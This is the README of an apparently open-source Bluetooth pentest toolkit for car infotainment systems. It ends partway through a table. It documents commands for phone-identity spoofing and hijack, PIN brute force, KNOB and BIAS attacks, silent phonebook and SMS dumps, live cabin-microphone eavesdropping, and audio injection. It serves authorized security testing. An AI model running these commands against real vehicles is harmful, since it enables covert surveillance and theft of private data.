<p align="center">
  <img src="assets/banner.svg" alt="Blue-Tap Banner" width="100%"/>
</p>

<p align="center">
  <b>Bluetooth/BLE Penetration Testing Toolkit for Automotive IVI Systems</b><br/>
  <sub>by <a href="https://github.com/Indspl0it">Santhosh Ballikonda</a> · Python 3.10+ · Linux · <a href="LICENSE">GPLv3</a></sub>
</p>

---

## Table of Contents

- [Purpose](#purpose)
- [Architecture](#architecture)
- [Features](#features)
  - [Discovery and Scanning](#1-discovery-and-scanning)
  - [Reconnaissance](#2-reconnaissance)
  - [Vulnerability Assessment](#3-vulnerability-assessment)
  - [Data Extraction](#4-data-extraction-pbap--map--at)
  - [Connection Hijacking](#5-connection-hijacking)
  - [Audio Interception](#6-audio-interception-hfp--a2dp)
  - [AVRCP Media Control](#7-avrcp-media-control)
  - [Protocol Fuzzing](#8-protocol-fuzzing)
  - [Denial of Service](#9-denial-of-service)
  - [MAC Spoofing](#10-mac-address-spoofing)
  - [Automation and Orchestration](#11-automation-and-orchestration)
  - [Link Key Harvest](#12-link-key-harvest-and-persistent-access)
  - [SSP Downgrade](#13-ssp-downgrade-attack)
  - [KNOB Attack](#14-knob-attack-cve-2019-9506)
  - [Fleet-Wide Assessment](#15-fleet-wide-assessment)
  - [Session Management and Reporting](#16-session-management-and-reporting)
- [Quick Start](#quick-start)
- [Usage Guide](#usage-guide)
- [Workflows](#workflows)
- [Vulnerable IVI Simulator](#vulnerable-ivi-simulator)
- [Troubleshooting](#troubleshooting)
- [Platform Notes](#platform-notes)
- [Legal Disclaimer](#legal-disclaimer)
- [Changelog](docs/CHANGELOG.md)

---

## Purpose

Blue-Tap is a Bluetooth/BLE penetration testing toolkit built for automotive IVI security assessments. It discovers and fingerprints Bluetooth devices, identifies known CVEs and configuration weaknesses, hijacks connections via identity cloning and pairing attacks (BIAS, SSP downgrade, KNOB), extracts phonebooks, messages, and call audio, and fuzzes 11 Bluetooth protocols with a response-guided engine that detects crashes, information leaks, and behavioral anomalies without requiring firmware access or special hardware. All findings are logged into sessions and exported as evidence-backed HTML/JSON pentest reports.

### What Blue-Tap Does

- **Discovers** Bluetooth Classic and BLE devices in range, classifying IVI systems by device class, name heuristics, and service UUIDs. Fleet-wide scanning assesses all nearby devices in one pass.
- **Fingerprints** target devices to determine Bluetooth version, LMP features, chipset manufacturer, supported profiles, pairing mode, IO capabilities, and attack surface.
- **Assesses vulnerabilities** with 20+ evidence-based checks covering known CVEs (KNOB, BLURtooth, BIAS, BlueBorne, PerfektBlue, BrakTooth, BLUFFS, Invalid Curve, SweynTooth) and configuration weaknesses. Each finding includes severity, confidence, CVE reference, evidence, and remediation.
- **Extracts data** via PBAP (phonebook, call logs, favorites), MAP (SMS/MMS/email messages), AT commands (IMEI, IMSI, phonebook, SMS), and OBEX Object Push — all without user awareness on the IVI.
- **Hijacks connections** by impersonating a paired phone (MAC + name + device class cloning) to access the IVI without re-pairing. Supports BIAS (CVE-2020-10135) role-switch authentication bypass for devices that validate link keys.
- **Harvests link keys** from captured pairing exchanges and stores them for persistent reconnection — proving that a single intercepted pairing gives indefinite access to the vehicle.
- **Downgrades pairing security** by forcing SSP to legacy PIN mode and brute-forcing the PIN (0000-9999), or executing the KNOB attack (CVE-2019-9506) to negotiate minimum encryption key entropy.
- **Intercepts audio** through HFP (call audio capture, DTMF injection, call control — dial, answer, hangup, hold) and A2DP (media stream capture, microphone eavesdropping, audio playback injection).
- **Controls media** via AVRCP — play, pause, skip, volume manipulation, metadata surveillance. Skip flooding and volume ramp for DoS demonstration.
- **Fuzzes 11 Bluetooth protocols** with a response-guided, state-aware fuzzing engine featuring 6 layers of intelligence: protocol state inference (AFLNet-adapted), anomaly-guided field mutation weights, structural PDU validation, timing-based coverage proxy, entropy-based leak detection, and watchdog reboot detection. Live dashboard with real-time crash tracking.
- **Manages crashes** with SQLite-backed crash database, severity classification, reproduction verification, payload minimization (binary search + delta debugging + field-level reduction), and evidence export.
- **Generates reports** in HTML and JSON with executive summary, SVG charts, vulnerability findings with evidence, fuzzing intelligence analysis (state coverage, field weights, timing clusters, health events), crash details with hexdumps and reproduction steps, and data extraction summaries.

### Who It's For

- Automotive security researchers and penetration testers
- OEM/Tier-1 security teams performing Bluetooth stack assessments
- Red teams testing vehicle connectivity systems
- Security researchers studying Bluetooth protocol vulnerabilities

### Authorization Requirement

Blue-Tap is designed exclusively for **authorized security testing**. You must have explicit written permission from the vehicle/device owner before conducting any assessment. Unauthorized use against devices you do not own or have permission to test is illegal.

---

## Architecture

### System Overview

```
┌──────────────────────────────────────────────────────────────────────────────┐
│                           ATTACKER MACHINE (Kali Linux / Ubuntu)             │
│                                                                              │
│  ┌────────────────────────────────────────────────────────────────────────┐  │
│  │                          Blue-Tap CLI (click)                          │  │
│  │                                                                        │  │
│  │  blue-tap [--session NAME] [--verbose] <command> <subcommand> [args]   │  │
│  │                                                                        │  │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐                 │  │
│  │  │  Session Mgr  │  │ LoggedCommand│  │  Report Gen  │                 │  │
│  │  │  (session.py) │  │   (cli.py)   │  │(generator.py)│                 │  │
│  │  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘                 │  │
│  │         │    Auto-logs every command          │                         │  │
│  │         ▼                                     ▼                         │  │
│  │  sessions/<name>/          HTML/JSON report from session data           │  │
│  │    session.json                                                         │  │
│  │    001_scan.json                                                        │  │
│  │    002_vulnscan.json                                                    │  │
│  │    pbap/ map/ audio/                                                    │  │
│  └────────────────────────────────────────────────────────────────────────┘  │
│                                                                              │
│  ┌─────────────────────────────────────────────────────────────────────────┐ │
│  │                         CORE MODULES                                    │ │
│  │                                                                         │ │
│  │  ┌──────────────┐  ┌───────────────┐  ┌──────────────┐                 │ │
│  │  │   Scanner     │  │  Fingerprint  │  │   Spoofer    │                 │ │
│  │  │ Classic + BLE │  │  LMP version  │  │  MAC + Name  │                 │ │
│  │  │  (scanner.py) │  │  Chipset/Caps │  │  + DevClass  │                 │ │
│  │  └──────┬───────┘  └──────┬────────┘  └──────┬───────┘                 │ │
│  │         │                  │                   │                         │ │
│  │  ┌──────┴──────┐  ┌───────┴────────┐  ┌──────┴───────┐                 │ │
│  │  │  SDP Browse  │  │  RFCOMM Scan   │  │  L2CAP Scan  │                 │ │
│  │  │  (sdp.py)    │  │ (rfcomm_scan)  │  │ (l2cap_scan) │                 │ │
│  │  └─────────────┘  └────────────────┘  └──────────────┘                 │ │
│  │                                                                         │ │
│  │  ┌──────────────┐  ┌───────────────┐  ┌──────────────┐                 │ │
│  │  │  GATT Enum   │  │  HCI Capture  │  │   Sniffer    │                 │ │
│  │  │  (gatt.py)   │  │(hci_capture)  │  │  nRF / USRP  │                 │ │
│  │  └──────────────┘  └───────────────┘  └──────────────┘                 │ │
│  └─────────────────────────────────────────────────────────────────────────┘ │
│                                                                              │
│  ┌─────────────────────────────────────────────────────────────────────────┐ │
│  │                        ATTACK MODULES                                   │ │
│  │                                                                         │ │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐     │ │
│  │  │  VulnScan │ │  Hijack  │ │   PBAP   │ │   MAP    │ │   HFP    │     │ │
│  │  │ 20+ checks│ │ Full IVI │ │ Phonebook│ │ Messages │ │Call Audio│     │ │
│  │  │ CVE-based │ │ takeover │ │ + Calls  │ │ SMS/MMS  │ │ SCO link │     │ │
│  │  └──────────┘ └──────────┘ └──────────┘ └──────────┘ └──────────┘     │ │
│  │                                                                         │ │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐     │ │
│  │  │   A2DP   │ │  AVRCP   │ │   OPP    │ │   BIAS   │ │   DoS    │     │ │
│  │  │ Media/Mic│ │ Media Ctl│ │ File Push│ │CVE-2020- │ │Pair/Name │     │ │
│  │  │CapturInj │ │ Vol Ramp │ │   vCard  │ │  10135   │ │  Flood   │     │ │
│  │  └──────────┘ └──────────┘ └──────────┘ └──────────┘ └──────────┘     │ │
│  │                                                                         │ │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐     │ │
│  │  │BlueSnarfr│ │SSP Downgr│ │  KNOB    │ │Key Harvst│ │  Fleet   │     │ │
│  │  │ AT Cmds  │ │Force PIN │ │CVE-9506  │ │Link Keys │ │Multi-Dev │     │ │
│  │  └──────────┘ └──────────┘ └──────────┘ └──────────┘ └──────────┘     │ │
│  └─────────────────────────────────────────────────────────────────────────┘ │
│                                                                              │
│  ┌─────────────────────────────────────────────────────────────────────────┐ │
│  │                     PROTOCOL FUZZING ENGINE                             │ │
│  │                                                                         │ │
│  │  ┌──────────────────────────────────────────────────────────────────┐   │ │
│  │  │                    FuzzCampaign (engine.py)                       │   │ │
│  │  │  Orchestrates multi-protocol fuzzing with live dashboard         │   │ │
│  │  │  Protocol rotation • Stats tracking • Crash detection            │   │ │
│  │  └──────────┬───────────────────┬───────────────────┬───────────┘   │   │ │
│  │             │                   │                   │               │   │ │
│  │  ┌──────────▼──────┐ ┌─────────▼────────┐ ┌────────▼─────────┐    │   │ │
│  │  │   Strategies     │ │  Protocol Builders│ │   Transports     │    │   │ │
│  │  │ ┌─────────────┐  │ │ ┌──────────────┐  │ │ ┌─────────────┐ │    │   │ │
│  │  │ │ Random Walk  │  │ │ │ L2CAP Sig    │  │ │ │ L2CAP       │ │    │   │ │
│  │  │ │ Coverage     │  │ │ │ RFCOMM       │  │ │ │ RFCOMM      │ │    │   │ │
│  │  │ │ State Machine│  │ │ │ SDP          │  │ │ │ BLE (bleak) │ │    │   │ │
│  │  │ │ Targeted     │  │ │ │ OBEX         │  │ │ └─────────────┘ │    │   │ │
│  │  │ └─────────────┘  │ │ │ ATT/GATT     │  │ │                  │    │   │ │
│  │  └──────────────────┘ │ │ SMP          │  │ └──────────────────┘    │   │ │
│  │                        │ │ BNEP         │  │                         │   │ │
│  │  ┌──────────────────┐ │ │ AT Commands  │  │ ┌──────────────────┐    │   │ │
│  │  │   Crash DB       │ │ └──────────────┘  │ │   Corpus Mgr     │    │   │ │
│  │  │  SQLite storage  │ │                    │ │  Seed generation │    │   │ │
│  │  │  Severity/Type   │ └────────────────────┘ │  Protocol-tagged │    │   │ │
│  │  │  Reproducibility │                        └──────────────────┘    │   │ │
│  │  └──────────────────┘ ┌──────────────────┐  ┌──────────────────┐    │   │ │
│  │                        │   Minimizer      │  │   PCAP Replay    │    │   │ │
│  │  ┌──────────────────┐ │  Binary search   │  │  btsnoop parser  │    │   │ │
│  │  │   Mutators       │ │  Delta debug     │  │  Frame filter    │    │   │ │
│  │  │ Field/Int/Length  │ │  Field reducer   │  │  Mutation replay │    │   │ │
│  │  │ Protocol/Corpus  │ └──────────────────┘  └──────────────────┘    │   │ │
│  │  └──────────────────┘                                               │   │ │
│  │                                                                     │   │ │
│  │  ┌──────────── Fuzzing Intelligence (Phase 1-6) ─────────────────┐  │   │ │
│  │  │ State Inference │ Field Weights │ Response Analyzer │ Health   │  │   │ │
│  │  │ (AFLNet IPSM)   │ (BrakTooth)   │ Struct+Time+Leak  │ Monitor  │  │   │ │
│  │  └────────────────────────────────────────────────────────────────┘  │   │ │
│  └─────────────────────────────────────────────────────────────────────┘   │ │
│                                                                              │
│  ┌──────────────────────────────┐                                           │
│  │    Bluetooth Adapter (HCI)    │                                           │
│  │    hci0 / hci1                │                                           │
│  │    BlueZ 5.x + D-Bus         │                                           │
│  └──────────────┬───────────────┘                                           │
└─────────────────┼───────────────────────────────────────────────────────────┘
                  │
      ~~~~~~~~~~~~│~~~~~~~~~~~~  Bluetooth Air (2.4 GHz)  ~~~~~~~~~~~~
                  │
    ┌─────────────┴────────────────────────────────────────────────┐
    │                                                              │
    ▼                                                              ▼
┌──────────────────────────────┐       ┌──────────────────────────────────┐
│    TARGET IVI SYSTEM          │       │       VICTIM'S PHONE              │
│                               │       │                                   │
│  Car Infotainment Unit        │       │  Paired to IVI via Bluetooth      │
│  ┌─────────────────────────┐  │       │                                   │
│  │ Bluetooth Stack         │  │       │  Blue-Tap impersonates this       │
│  │  PBAP Server (contacts) │  │       │  phone's MAC address to gain      │
│  │  MAP Server (messages)  │  │       │  access to the IVI without        │
│  │  HFP Audio Gateway      │  │       │  re-pairing (hijack attack).      │
│  │  A2DP Sink (speakers)   │  │       │                                   │
│  │  AVRCP Target           │  │       │  ┌─────────────────────────────┐  │
│  │  OPP Server             │  │       │  │ MAC: AA:BB:CC:DD:EE:FF     │  │
│  │  SPP / DUN / PAN        │  │       │  │ Bonded to IVI              │  │
│  │  BLE GATT Services      │  │       │  │ Has link key stored        │  │
│  └─────────────────────────┘  │       │  └─────────────────────────────┘  │
│                               │       │                                   │
│  SDP Records (8+ services)    │       └──────────────────────────────────┘
│  L2CAP PSMs (SDP,RFCOMM,...)  │
│  RFCOMM Channels (1-30)       │
│  BLE Advertisement + GATT     │
└───────────────────────────────┘
```

### Data Flow: Hijack Attack

```
 Attacker                    IVI (Car)                Phone (Victim)
    │                           │                          │
    │  1. scan classic          │                          │
    │ ─────────────────────────>│  Inquiry Response        │
    │ <─────────────────────────│  "SYNC" / Car Audio      │
    │                           │                          │
    │  2. recon sdp/fingerprint │                          │
    │ ─────────────────────────>│  SDP Browse + LMP Info   │
    │ <─────────────────────────│  Services, BT version    │
    │                           │                          │
    │  3. spoof mac PHONE_MAC   │                          │
    │  (local adapter change)   │                          │
    │                           │                          │
    │  4. hijack IVI PHONE_MAC  │                          │
    │ ─────────────────────────>│  Connects as "phone"     │
    │ <─────────────────────────│  Auto-authorized (bond)  │
    │                           │                          │
    │  5. PBAP GET phonebook    │                          │
    │ ─────────────────────────>│  OBEX PBAP Session       │
    │ <─────────────────────────│  vCards (contacts+calls)  │
    │                           │                          │
    │  6. MAP GET messages      │                          │
    │ ─────────────────────────>│  OBEX MAP Session        │
    │ <─────────────────────────│  bMessages (SMS/MMS)     │
    │                           │                          │
    │  7. HFP SLC setup         │                          │
    │ ─────────────────────────>│  AT command handshake    │
    │ <─────────────────────────│  +BRSF, +CIND, OK        │
    │                           │                          │
    │  8. report                │                          │
    │  (generates HTML/JSON)    │                          │
```

### Internal Module Dependencies

```
cli.py ──────────────────────────────────────────────────────────
  │
  ├── core/
  │   ├── adapter.py      ← hciconfig, btmgmt, bluetoothctl
  │   ├── scanner.py      ← hcitool (Classic), bleak (BLE)
  │   └── spoofer.py      ← bdaddr, hciconfig, btmgmt
  │
  ├── recon/
  │   ├── sdp.py          ← sdptool, raw L2CAP PSM 1
  │   ├── fingerprint.py  ← hcitool info, LMP features
  │   ├── gatt.py         ← bleak (BLE GATT client)
  │   ├── rfcomm_scan.py  ← socket(BTPROTO_RFCOMM)
  │   ├── l2cap_scan.py   ← socket(BTPROTO_L2CAP)
  │   ├── sniffer.py      ← nRF Sniffer, USRP B210
  │   └── hci_capture.py  ← btmon
  │
  ├── attack/
  │   ├── vuln_scanner.py  ← recon/* (SDP, RFCOMM, fingerprint)
  │   ├── hijack.py        ← spoofer + pbap + map + hfp
  │   ├── pbap.py          ← socket(RFCOMM) + OBEX binary
  │   ├── map_client.py    ← socket(RFCOMM) + OBEX binary
  │   ├── hfp.py           ← socket(RFCOMM) + AT commands + SCO
  │   ├── a2dp.py          ← PulseAudio (pulsectl)
  │   ├── avrcp.py         ← D-Bus via dbus-fast (async)
  │   ├── bias.py          ← L2CAP role-switch manipulation
  │   ├── bluesnarfer.py   ← socket(RFCOMM) + AT commands
  │   ├── dos.py           ← pairing flood, l2ping, name flood
  │   ├── opp.py           ← socket(RFCOMM) + OBEX Push
  │   ├── pin_brute.py     ← D-Bus pairing agent
  │   ├── key_harvest.py   ← HCI capture + link key extraction + key DB
  │   ├── ssp_downgrade.py ← IO cap manipulation + PIN brute force
  │   ├── knob.py          ← CVE-2019-9506 key negotiation + brute force
  │   └── fleet.py         ← device classification + fleet-wide vuln scan
  │
  ├── fuzz/
  │   ├── engine.py              ← campaign orchestrator + main loop
  │   ├── transport.py           ← L2CAP/RFCOMM/BLE socket abstractions
  │   ├── crash_db.py            ← SQLite crash storage + dedup
  │   ├── corpus.py              ← protocol-tagged seed management
  │   ├── mutators.py            ← field/integer/length/corpus mutation
  │   ├── minimizer.py           ← binary search + ddmin + field reduction
  │   ├── pcap_replay.py         ← btsnoop v1 parser + replay engine
  │   ├── state_inference.py     ← AFLNet-adapted protocol state graph
  │   ├── field_weight_tracker.py← anomaly-guided field mutation weights
  │   ├── response_analyzer.py   ← 3-layer anomaly detection (struct+time+leak)
  │   ├── health_monitor.py      ← watchdog reboot + degradation detection
  │   ├── protocols/             ← 8 protocol-specific builders
  │   └── strategies/            ← 4 campaign strategies
  │
  ├── report/
  │   └── generator.py    ← session data → HTML/JSON reports
  │
  └── utils/
      ├── output.py       ← Rich console (tables, panels, colors)
      ├── session.py      ← JSON-L session logging
      ├── interactive.py  ← Device selection prompts
      └── bt_helpers.py   ← run_cmd, check_tool, MAC validation
```

---

## Features

### 1. Discovery and Scanning

Passive and active discovery of Bluetooth Classic and BLE devices in range.

| Command | Description |
|---------|-------------|
| `blue-tap scan classic` | Bluetooth Classic inquiry scan — discovers BR/EDR devices, shows name, MAC, device class, RSSI |
| `blue-tap scan ble` | BLE scan using bleak — discovers LE advertisers, shows name, MAC, services, manufacturer data |
| `blue-tap scan ble --passive` | Passive BLE scan (no SCAN_REQ sent) — stealthier, only collects advertisement data |
| `blue-tap scan all` | Simultaneous Classic + BLE scan |

**Key capabilities:**
- Device class decoding (identifies Car Audio, Hands-Free, Phone, Computer, etc.)
- RSSI signal strength display for proximity estimation
- JSON output (`-o results.json`) for scripted pipelines
- Configurable scan duration (`-d 30` for 30 seconds)
- Adapter selection (`-i hci1`) for multi-adapter setups

---

### 2. Reconnaissance

Deep service enumeration, device fingerprinting, and radio-level capture.

| Command | Description |
|---------|-------------|
| `blue-tap recon sdp <MAC>` | Browse all SDP service records — profiles, channels, UUIDs, provider strings |
| `blue-tap recon fingerprint <MAC>` | Device fingerprinting — BT version, LMP features, chipset, manufacturer, capabilities |
| `blue-tap recon rfcomm-scan <MAC>` | Brute-force scan RFCOMM channels 1-30 for open/hidden services |
| `blue-tap recon l2cap-scan <MAC>` | Scan well-known L2CAP PSMs for open services; `--dynamic` adds dynamic range |
| `blue-tap recon gatt <MAC>` | BLE GATT service/characteristic enumeration with read/write/notify properties |
| `blue-tap recon ssp <MAC>` | Check if device supports Secure Simple Pairing |
| `blue-tap recon pairing-mode <MAC>` | Detect pairing mode (Legacy PIN vs SSP) and IO capabilities |
| `blue-tap recon capture-start` | Start HCI traffic capture via btmon (saves btsnoop format) |
| `blue-tap recon capture-stop` | Stop btmon capture |

**Advanced radio reconnaissance (requires specialized hardware):**

| Command | Hardware | Description |
|---------|----------|-------------|
| `blue-tap recon nrf-scan` | nRF52840 dongle | BLE advertisement scanning with raw PDU access |
| `blue-tap recon nrf-sniff` | nRF52840 dongle | Sniff BLE pairing exchanges (capture STK/LTK negotiation) |
| `blue-tap recon usrp-scan` | USRP B210 | Scan for BR/EDR piconets at baseband level |
| `blue-tap recon usrp-follow` | USRP B210 | Follow and capture BR/EDR piconet traffic |
| `blue-tap recon usrp-capture` | USRP B210 | Raw IQ capture for offline analysis |
| `blue-tap recon crack-key` | — | Crack BLE pairing key from captured pcap using Crackle |
| `blue-tap recon extract-link-key` | — | Extract BR/EDR link key from captured pairing exchange |
| `blue-tap recon inject-link-key` | — | Inject recovered link key into BlueZ for reconnection |

---

### 3. Vulnerability Assessment

Evidence-based vulnerability scanner with 20+ checks covering known CVEs, protocol weaknesses, and configuration issues. Each finding includes severity, CVE reference, impact description, remediation guidance, status (confirmed/potential/unverified), and confidence rating.

```
blue-tap vulnscan <MAC>
blue-tap vulnscan <MAC> -o findings.json
```

**Vulnerability checks performed:**

| Check | CVE(s) | What It Detects |
|-------|--------|-----------------|
| Service Exposure | — | Sensitive RFCOMM services (PBAP/MAP) reachable without auth challenge |
| KNOB | CVE-2019-9506 | LMP key size negotiation downgrade (BT < 5.1, pause_encryption) |
| BLURtooth / CTKD | CVE-2020-15802 | Cross-transport key derivation overwrite (BT 4.2-5.0, dual-mode) |
| PerfektBlue | CVE-2024-45431/32/33/34 | OpenSynergy BlueSDK vulns (VW/Audi/Mercedes IVI, invalid CID probe) |
| BLUFFS | CVE-2023-24023 | Session key derivation downgrade (BT 4.2-5.4) |
| PIN Pairing Bypass | CVE-2020-26555 | BR/EDR impersonation via PIN response spoofing |
| Invalid Curve | CVE-2018-5383 | ECDH public key validation skip in SSP/SC (BT 4.2-5.0) |
| BIAS | CVE-2020-10135 | Authentication bypass via role-switch during reconnection |
| BlueBorne | CVE-2017-1000251 | L2CAP configuration response buffer overflow (kernel < 4.13.1) |
| Pairing Method | — | Legacy PIN vs SSP Just Works vs MITM-protected |
| Writable GATT | — | BLE characteristics writable without authentication (OTA update, diagnostics) |
| BrakTooth Chipset | — | Chipset identification for BrakTooth family vulnerabilities |
| EATT Support | — | Enhanced ATT channel support and L2CAP CoC configuration |
| Hidden RFCOMM | — | RFCOMM channels open but not advertised in SDP |
| Encryption Enforcement | — | Services accessible without mandatory encryption |
| PIN Lockout | — | Absence of rate limiting on pairing attempts |
| Device Class | — | Identifies Car Audio / Hands-Free device class (IVI indicator) |
| LMP Features | — | Feature flag analysis (encryption, SC, LE, dual-mode) |
| Authorization Model | — | Service authorization policy (trust-on-first-use, per-service, etc.) |
| Automotive Diagnostics | — | OBD/UDS/diagnostic service exposure via Bluetooth |

**Finding classification:**
- **Status:** `confirmed` (directly observed), `potential` (version/heuristic based), `unverified` (requires active exploit)
- **Confidence:** `high`, `medium`, `low`
- **Severity:** `CRITICAL`, `HIGH`, `MEDIUM`, `LOW`, `INFO`

---

### 4. Data Extraction (PBAP / MAP / AT)

#### PBAP — Phone Book Access Profile

Download phonebook contacts and call history from the IVI's synced phone data.

```
blue-tap pbap pull <MAC>                     # Pull main phonebook
blue-tap pbap pull <MAC> -p telecom/ich.vcf  # Incoming call history
blue-tap pbap pull <MAC> -p telecom/och.vcf  # Outgoing call history
blue-tap pbap pull <MAC> -p telecom/mch.vcf  # Missed call history
blue-tap pbap pull <MAC> -p telecom/cch.vcf  # Combined call history
blue-tap pbap dump <MAC>                     # Dump ALL: contacts + all call logs + favorites + SIM
blue-tap pbap dump <MAC> -o ./pbap_data/     # Custom output directory
```

**What's extracted:**
- vCard 2.1/3.0 contacts (name, phone numbers, email, address, organization)
- Call history with timestamps, durations, and phone numbers
- SIM phonebook entries (if synced)
- Speed dial / favorites

#### MAP — Message Access Profile

Download SMS and MMS messages stored on the IVI.

```
blue-tap map list <MAC>                    # List messages in inbox
blue-tap map list <MAC> --folder sent      # List sent messages
blue-tap map dump <MAC>                    # Dump all messages from all folders
blue-tap map dump <MAC> -o ./messages/     # Custom output directory
```

**Message folders:** inbox, sent, draft, deleted, outbox

#### AT Command Extraction

Direct data extraction via AT commands over RFCOMM (bluesnarfer-style).

```
blue-tap at connect <MAC>                  # Interactive AT command session
blue-tap at dump <MAC>                     # Dump all: phonebook, SMS, device info
blue-tap at snarf <MAC>                    # External bluesnarfer binary
```

**Data available via AT:**
- `AT+CPBR` — Phonebook entries
- `AT+CMGL` — SMS messages
- `AT+CGSN` — IMEI
- `AT+CIMI` — IMSI
- `AT+CBC` — Battery status
- `AT+CSQ` — Signal strength

---

### 5. Connection Hijacking

Full IVI takeover by impersonating the owner's phone.

```
blue-tap hijack <IVI_MAC> <PHONE_MAC>
blue-tap hijack <IVI_MAC> <PHONE_MAC> --phone-name "John's iPhone"
blue-tap hijack <IVI_MAC> <PHONE_MAC> --bias          # Use BIAS CVE-2020-10135
blue-tap hijack <IVI_MAC> <PHONE_MAC> --recon-only     # Recon phase only
blue-tap hijack <IVI_MAC> <PHONE_MAC> --skip-audio     # Skip HFP setup
```

**Attack phases:**
1. **Recon** — Fingerprint IVI, enumerate SDP services, identify profiles and channels
2. **Impersonate** — Spoof attacker's MAC address, adapter name, and device class to match the phone
3. **Connect** — Connect to IVI as the spoofed phone; IVI sees a bonded device and auto-authorizes
4. **PBAP Extract** — Download phonebook and call history via OBEX PBAP
5. **MAP Extract** — Download SMS/MMS messages via OBEX MAP
6. **Audio Setup** — Establish HFP Service Level Connection for call interception

**BIAS mode (`--bias`):** When the IVI validates link keys and rejects simple MAC spoofing, the BIAS attack (CVE-2020-10135) exploits a role-switch during reconnection to bypass authentication entirely.

---

### 6. Audio Interception (HFP / A2DP)

#### HFP — Hands-Free Profile

Call audio capture and injection over SCO (Synchronous Connection-Oriented) links.

```
blue-tap hfp connect <MAC>                # Establish Service Level Connection (SLC)
blue-tap hfp capture <MAC> -o call.wav    # Capture call audio to WAV
blue-tap hfp inject <MAC> -f audio.wav    # Inject audio into active call
blue-tap hfp at <MAC> -c "AT+COPS?"      # Send raw AT command
blue-tap hfp dtmf <MAC> -t "1234#"       # Send DTMF tones
blue-tap hfp hold <MAC> -a 2             # Call hold/swap
blue-tap hfp redial <MAC>                 # Redial last number
blue-tap hfp voice <MAC> --activate       # Trigger voice assistant
```

#### A2DP — Advanced Audio Distribution

Media stream capture, microphone eavesdropping, and audio injection via PulseAudio.

```
blue-tap audio devices                     # List Bluetooth audio sources/sinks
blue-tap audio profile <MAC> hfp           # Switch to HFP profile (mic access)
blue-tap audio profile <MAC> a2dp          # Switch to A2DP profile (media)
blue-tap audio record-mic <MAC>            # Record from car's Bluetooth microphone
blue-tap audio live <MAC>                  # Live eavesdrop: car mic → laptop speakers
blue-tap audio capture <MAC>               # Capture A2DP media stream to WAV
blue-tap audio play <MAC> file.mp3         # Play file through car speakers
blue-tap audio loopback <MAC>              # Route laptop mic → car speakers
blue-tap audio loopback-stop               # Stop loopback
blue-tap audio diagnose <MAC>              # Diagnose Bluetooth audio issues
blue-tap audio list                        # List captured audio files
blue-tap audio playback <file>             # Play captured file locally
blue-tap audio review                      # Interactive audio file review
```

---

### 7. AVRCP Media Control

Audio/Video Remote Control Profile attacks.

```
blue-tap avrcp play <MAC>                  # Send play command
blue-tap avrcp pause <MAC>                 # Send pause
blue-tap avrcp stop <MAC>                  # Send stop
blue-tap avrcp next <MAC>                  # Skip to next track
blue-tap avrcp prev <MAC>                  # Skip to previous track
blue-tap avrcp volume <MAC> -l 127         # Set volume to max
blue-tap avrcp volume-ramp <MAC> --start 0 --end 127 --step 5
                                           # Gradual volume escalation attack
blue-tap avrcp skip-flood <MAC> -n 100     # Rapid track skip injection
blue-tap avrcp metadata <MAC>              # Show current track metadata
blue-tap avrcp monitor <MAC>               # Monitor track changes in real-time
```

---

### 8. Protocol Fuzzing

Response-guided, state-aware fuzzing engine designed for discovering 0-day vulnerabilities in automotive IVI Bluetooth stacks. Works purely over-the-air with standard hardware — no firmware access, no special dongles, no target instrumentation required.

The engine combines techniques from published research (AFLNet, BrakTooth, SNIPUZZ, Defensics) with novel approaches (entropy-based leak detection, timing-based coverage proxy, structural self-consistency validation) to detect bugs that traditional blind fuzzers miss.

#### Architecture

```
                        ┌─────────────────────────────────┐
                        │        Campaign Engine           │
                        │   (protocol rotation, transport) │
                        └────────┬──────────┬──────────────┘
                                 │          │
              ┌──────────────────┤          ├──────────────────────┐
              ▼                  ▼          ▼                      ▼
    ┌─────────────────┐  ┌────────────┐  ┌──────────────┐  ┌──────────────┐
    │  State Inference │  │  Mutation  │  │   Response   │  │    Health    │
    │   (AFLNet IPSM)  │  │  Weights   │  │   Analyzer   │  │   Monitor   │
    │  state_inference │  │  field_wt  │  │  response_   │  │  health_    │
    │       .py        │  │  tracker.py│  │  analyzer.py │  │  monitor.py │
    └─────────────────┘  └────────────┘  └──────────────┘  └──────────────┘
      Protocol state       Adaptive        3-layer anomaly    Watchdog reboot
      graph + scoring      field-level     detection: struct  detection, zombie
      + seed selection     mutation        + timing + entropy  state, degradation
```

#### Campaign Mode

```bash
blue-tap fuzz campaign <MAC>                              # Fuzz all protocols
blue-tap fuzz campaign <MAC> -p sdp -p rfcomm             # Specific protocols
blue-tap fuzz campaign <MAC> --strategy targeted           # CVE-targeted mutations
blue-tap fuzz campaign <MAC> --strategy state-machine      # Protocol state violations
blue-tap fuzz campaign <MAC> --strategy coverage           # Response-guided coverage
blue-tap fuzz campaign <MAC> --duration 2h --capture       # 2 hours + pcap capture
blue-tap fuzz campaign <MAC> -n 50000 --delay 0.1          # 50K iterations, fast
blue-tap fuzz campaign --resume                            # Resume previous campaign
```

#### Supported Protocols (11)

| Protocol | Transport | Attack Surface |
|----------|-----------|----------------|
| `sdp` | L2CAP PSM 1 | Service records, continuation state, data elements, PDU parsing |
| `rfcomm` | L2CAP PSM 3 | Frame types, PN/MSC/RPN negotiation, credit flow, FCS |
| `l2cap` | L2CAP PSM 1 | Signaling commands, config options, CID manipulation, echo |
| `obex-pbap` | RFCOMM ch 15 | PBAP headers, app parameters, session lifecycle |
| `obex-map` | RFCOMM ch 16 | MAP headers, message listing, folder traversal |
| `obex-opp` | RFCOMM ch 9 | Object Push headers, large payloads |
| `at-hfp` | RFCOMM ch 10 | HFP SLC handshake, codec negotiation, AT injection |
| `at-phonebook` | RFCOMM ch 1 | AT+CPBR phonebook access |
| `at-sms` | RFCOMM ch 1 | AT+CMGL/CMGR SMS commands |
| `ble-att` | BLE CID 4 | ATT handles, writes, MTU, prepare writes, signed writes |
| `ble-smp` | BLE CID 6 | Pairing, key sizes, ECDH curve points, sequencing |
| `bnep` | L2CAP PSM 15 | Setup connection, ethernet frames, filter lists |

#### Fuzzing Strategies

| Strategy | Approach | Best For |
|----------|----------|----------|
| `random` | 70% template + 30% corpus byte-level mutation with adaptive field weighting | General exploration, first-pass fuzzing |
